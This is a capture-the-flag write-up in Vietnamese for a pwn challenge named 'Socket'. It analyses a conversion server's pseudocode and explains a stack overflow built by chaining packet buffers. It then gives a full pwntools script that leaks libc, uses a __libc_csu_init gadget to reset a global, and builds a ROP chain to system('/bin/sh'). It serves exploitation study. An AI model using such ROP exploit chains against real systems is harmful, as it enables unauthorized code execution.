# Socket
## Challenge này thực sự rất hay!

# Undertand

Bài này có 1 số hàm như sau
* init
* init_packet
* check_hex
* hextobin
* bintohex
* process_packet
* main

Tại hàm main sẽ cho mình nhập 1 chuỗi có độ dài là 0x38

```sh
do
  {
    memset(buf, 0, sizeof(buf));
    bytes_read = read(0, buf, 0x38uLL);
    if ( bytes_read < 0 )
      exit(1);
    if ( buf[bytes_read - 1] == 10 )
      buf[bytes_read - 1] = 0;
    packet = (data *)malloc(0x18uLL);
    init_packet(packet, buf);
    retval = process_packet(packet);
    if ( retval == -1 )
      exit(1);
  }
  while ( retval );
  ```

  có 1 struct là packet, sau khi debug pseudocode thì mình đoán struct này có: mode,function, buf, 1 con trỏ next. 

  ```sh
  packet->mode = atoi((const char *)buf);
  *(_DWORD *)packet->function = *((_DWORD *)buf + 1);
  packet->buf = (char *)malloc(0x30uLL);
  memcpy(packet->buf, (char *)buf + 8, 0x30uLL);
  packet->next = 0LL;
  ```

chương trình sẽ bắt dữ liệu nhập vào không cho nhập quá độ dài khai báo.

nếu p->function = "htb" hoặc "bth" thì chương trình sẽ vào 1 trong 2 function để thực thi.

Khi vào 1 trong 2 function trên, thì nó sẽ check packet->mode.

```sh
if ( packet->mode == 1 )
  {
    if ( save )
    {
      if ( !strcmp(save->function, packet->function) )
      {
        for ( tmp = save; tmp->next; tmp = (data *)tmp->next )
          ;
        tmp->next = packet;
      }
    }
    else
    {
      save = packet;
    }
    retval = 1;
  }
  else
  {
    if ( packet->mode )
    {
      puts("What do you want to do?");
      return -1;
    }
    i = 0;
    if ( save && !strcmp(save->function, packet->function) )
    {
      for ( tmp_0 = save; ; tmp_0 = (data *)tmp_0->next )
      {
        memcpy(&buf[i], tmp_0->buf, 0x30uLL);
        i += 48;
        if ( !tmp_0->next )
          break;
      }
    }
    v2 = strlen(packet->buf);
    memcpy(&buf[i], packet->buf, v2);
    i_0 = 0;
    for ( j = 0; (unsigned int)i_0 <= 479; ++j )
    {
      v3 = j;
      if ( v3 >= strlen(buf) )
        break;
      t = 3;
      if ( buf[j] <= 47 || buf[j] > 57 )
      {
        if ( buf[j] > 96 && buf[j] <= 102 )
          c = buf[j] - 87;
      }
      else
      {
        c = buf[j] - 48;
      }
      while ( t >= 0 )
      {
        d = c / 2;
        m = c % 2;
        c /= 2;
        output[i_0 + t--] = m + 48;
      }
      i_0 += 4;
    }
    retval = 0;
    puts(output);
```
# Solution

Để khai thác chương trình chúng ta cần đáp ứng những tiêu chí sau:
* tính toán offset và gộp từng khối nhập vào, tạo thành 1 buf đủ lớn để bufferOverflow được controlflow.
* Set biến save (biến lưu địa chỉ của giá trị khối đầu tiên) bằng 0.
* leak libc, ret main -> tính base
* tính system, binsh rồi truyền vào cho lần nhập sau.

Set biến save ở đây để sau khi ret về main thì biến save sẽ giữ giá trị của khối đầu tiên mới, nếu ko thì nó sẽ lặp lại việc leak libc và ret về main 1 lần nữa.

Do ko có gadget pop rdx, cho nên chúng ta sẽ tận dụng mã code __libc_csu_init để gọi hàm read, truyền các tham số phù hợp để gọi được function read vào set save = 0

# Exploit

```python
from pwn import *
s = process("./socket")
context.log_level="debug"
pause()

# địa chỉ các gadget và function cần thiết
pop_rdi_ret = 0x00000000004011f3
puts_got = 0x602018
puts_plt = 0x4006c0
read_got = 0x602038
read_plt = 0x400700
main = 0x4010a3
ret= 0x00000000004006ae
addr_save = 0x6020b0
add_khoi2 = 0x00000000004011d0
add_6pop = 0x00000000004011ea 



s.recvuntil("Welcome to the convert server!\n")

#    mode      function
pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x60" + "\x00"*3
pl += p64(pop_rdi_ret)
pl += p64(puts_got)
pl += p64(puts_plt)
pl += p64(ret) 
pl += p64(main) 
s.send(pl)
s.send(pl)

pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x60" + "\x00"*3
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0) 
pl += p64(0x6020a0) 
s.send(pl)

pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x90" + "\x00"*3
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0) 
pl += p64(0x6020a0)
s.send(pl)

pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x90" + "\x00"*3
pl += p64(ret)
pl += p64(add_6pop)
pl += p64(0) #rbx
pl += p64(1) #rbp
pl += p64(read_got) #read_plt
s.send(pl)

pl = "1"
pl += p64(0x00627468627468)
pl += "\x00"*7 #pop_rdi
pl += p64(addr_save) #rsi - r14
pl += p64(0x30) #rdx
pl += p64(add_khoi2) # dia chi khoi thu 2 sau 6pop
pl += p64(ret) 
pl += p64(main) 
s.send(pl)

pl = "1"
pl += p64(0x00627468627468)
pl += "\x00"*7 #6pop tiep theo
pl += p64(0) 
pl += p64(0) 
pl += p64(0) 
pl += p64(0) 
pl += p64(pop_rdi_ret) #ret
s.send(pl)

pl = "1"
pl += p64(0x00627468627468)
pl += "\x00"*7 #pop_rdi
pl += p64(pop_rdi_ret) 
pl += p64(puts_got) 
pl += p64(puts_plt)
pl += p64(ret) 
pl += p64(main) 
s.send(pl)


pl = "0" + p64(0x00627468627468) + "abcdef1234567"
s.sendline(pl)
s.recvuntil("\n")

pl = p64(0)
s.send(pl)


# nhận giá trị trong put_got để tính base, system, binsh
puts_libc = u64(s.recv(6).ljust(8,"\x00"))
base = puts_libc-0x80aa0
system = base + 0x4f550
binsh = base + 0x1b3e1a
print ">> " + hex(puts_libc)
print "base >> " + hex(base)
print "system >> " + hex(system)
print "binsh >> " + hex(binsh)

s.recvuntil("Welcome to the convert server!\n")

pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x60" + "\x00"*3
pl += p64(pop_rdi_ret)
pl += p64(puts_got)
pl += p64(puts_plt)
pl += p64(ret) 
pl += p64(main) 
s.send(pl)
s.send(pl)

pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x60" + "\x00"*3
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0) 
pl += p64(0x6020a0) 
s.send(pl)

pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x90" + "\x00"*3
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0) 
pl += p64(0x6020a0)
s.send(pl)

pl = "1" + p64(0x00627468627468)
pl += "\x00"*3 + "\x90" + "\x00"*3
pl += p64(pop_rdi_ret)
pl += p64(binsh)
pl += p64(system) 
pl += p64(0)
pl += p64(0) #read_plt
s.send(pl)


pl = "0" + p64(0x00627468627468) + "abcdef1234567"
s.sendline(pl)



s.interactive()
```